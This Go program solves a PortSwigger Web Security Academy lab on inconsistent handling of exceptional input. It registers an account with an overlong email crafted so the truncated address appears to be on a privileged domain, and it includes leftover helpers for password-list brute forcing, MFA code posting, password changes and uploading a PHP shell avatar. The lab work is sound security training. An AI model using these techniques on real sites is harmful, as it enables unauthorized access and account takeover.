// https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input

package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
	"mime/multipart"
)

const trace bool = true

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	baseUrl := "https://0afe00ed03b2533ec55c02ca006c00c7.web-security-academy.net"
	//cartUrl := baseUrl + "/cart"
	//checkoutUrl := baseUrl + "/cart/checkout"
	registerUrl := baseUrl + "/register"
	//loginUrl := baseUrl + "/login"
	//avatarUrl := baseUrl + "/files/avatars/cmd.php"
	//changePassUrl := baseUrl + "/my-account/change-password"
	//changeAvatarUrl := baseUrl + "/my-account/avatar"
	//myUser := "wiener"
	//myPass := "peter"
	//vicUser := "carlos"
	//vicPass := ""
	user2 := "wiener2"
	email2 := "0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567@dontwannacry.com.exploit-0af70080033b5303c54701a4017b001a.exploit-server.net"
	pass2 := "2"

	client, err := newClient()
	if err != nil {
		return err
	}

	_, body, err := get(client, registerUrl, nil)
	if err != nil {
		return err
	}

	csrfToken := parseCSRFToken(body)

	//_, body, err = login(client, loginUrl, myUser, myPass, csrfToken)
	//if err != nil {
	//	return err
	//}

	values := make(url.Values)
	values.Set("csrf", csrfToken)
	values.Set("username", user2)
	values.Set("email", email2)
	values.Set("password", pass2)
	_, body, err = postForm(client, registerUrl, nil, values)
	if err != nil {
		return err
	}

	return nil
}

func postAvatar(
	client *http.Client,
	u, username, csrfToken, file string,
	fn func(b []byte) ([]byte, error),
) error {
	f, err := os.Open(file)
	if err != nil {
		return err
	}
	defer f.Close()

	values := make(map[string]io.Reader)
	values["avatar"] = f
	values["user"] = strings.NewReader(username)
	values["csrf"] = strings.NewReader(csrfToken)

	contentType, buf, err := multipartData(values)
	if err != nil {
		return err
	}

	headers := make(http.Header)
	headers.Set("content-type", contentType)

	b := buf.Bytes()
	if fn != nil {
		b, err = fn(b)
		if err != nil {
			return err
		}
	}

	_, _, err = postMulti(client, u, headers, b)
	return err
}


func resetPass(client *http.Client, u, username, csrfToken, host string) (int, string, error) {
	data := url.Values{
		"username": {username},
		"csrf": {csrfToken},
	}

	return postForm(client, u, nil, data)
}

func login(client *http.Client, u, username, password, csrfToken string) (int, string, error) {
	data := url.Values{
		"username": {username},
		"password": {password},
		"csrf": {csrfToken},
	}

	return postForm(client, u, nil, data)
}

func changePass(client *http.Client, u, username, currPass, newPass1, newPass2 string) (int, string, error) {
	data := url.Values{
		"username": {username},
		"current-password": {currPass},
		"new-password-1": {newPass1},
		"new-password-2": {newPass2},
	}

	return postForm(client, u, nil, data)
}

func tryPass(fn func(pass string) (bool, error)) (error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		pass := sc.Text()
		cont, err := fn(pass)
		if err != nil {
			return err
		}
		if !cont {
			break
		}
	}
	return nil
}

func postCode(client *http.Client, u, code, csrfToken string) (int, string, error) {
	data := url.Values{
		"mfa-code": {code},
		"csrf": {csrfToken},
	}

	return postForm(client, u, nil, data)
}

func multipartData(values map[string]io.Reader) (contentType string, b *bytes.Buffer, err error) {
    b = &bytes.Buffer{}
    w := multipart.NewWriter(b)
    for key, r := range values {
        var fw io.Writer
        if x, ok := r.(io.Closer); ok {
            defer x.Close()
        }
        if x, ok := r.(*os.File); ok {
            if fw, err = w.CreateFormFile(key, x.Name()); err != nil {
                return
            }
        } else {
            if fw, err = w.CreateFormField(key); err != nil {
                return
            }
        }
        if _, err = io.Copy(fw, r); err != nil {
            return
        }

    }
    // If you don't close it, your request will be missing the terminating boundary.
    w.Close()

    // Don't forget to set the content type, this will contain the boundary.
    contentType = w.FormDataContentType()
    return
}

func postMulti(client *http.Client, u string, headers http.Header, data []byte) (int, string, error) {
	return post(client, u, headers, data)
}

func postForm(client *http.Client, u string, headers http.Header, data url.Values) (int, string, error) {
	if headers == nil {
		headers = make(http.Header)
	} else {
		headers = headers.Clone()
	}
	headers.Set("content-type", "application/x-www-form-urlencoded")
	return post(client, u, headers, []byte(data.Encode()))
}

func post(client *http.Client, u string, headers http.Header, data []byte) (int, string, error) {
	req, err := http.NewRequest("POST", u, bytes.NewReader(data))
	if err != nil {
		return 0, "", err
	}
	setHeaders(req, headers)

	dumpReqOut(req)
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	dumpResp(resp)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
		return resp.StatusCode, string(body), fmt.Errorf("%v", resp.Status)
	}

	return resp.StatusCode, string(body), nil
}

func setHeaders(req *http.Request, headers http.Header) {
	for k, vals := range headers {
		req.Header.Del(k)
		for _, val := range vals {
			req.Header.Add(k, val)
		}
	}
}

func get(client *http.Client, u string, headers http.Header) (int, string, error) {
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return 0, "", err
	}
	setHeaders(req, headers)

	dumpReqOut(req)
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	dumpResp(resp)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
		return resp.StatusCode, string(body), fmt.Errorf("%v", resp.Status)
	}

	return resp.StatusCode, string(body), nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func parseCSRFToken(body string) string {
	return string(csrfRE.FindStringSubmatch(body)[1])
}

func setCookie(client *http.Client, us, name, value string) error {
	u, err := url.Parse(us)
	if err != nil {
		return err
	}
	c := &http.Cookie{Name: name, Value: value}
	client.Jar.SetCookies(u, []*http.Cookie{c})
	return nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{
		Jar: jar,
		Timeout: 10 * time.Second,
	}, nil
}

func dumpReqOut(req *http.Request) {
	if !trace {
		return
	}

	dump, err := httputil.DumpRequestOut(req, true)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("-----\n%q\n", dump)
}

func dumpResp(resp *http.Response) {
	if !trace {
		return
	}

	dump, err := httputil.DumpResponse(resp, true)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("-----\n%q\n", dump)
}
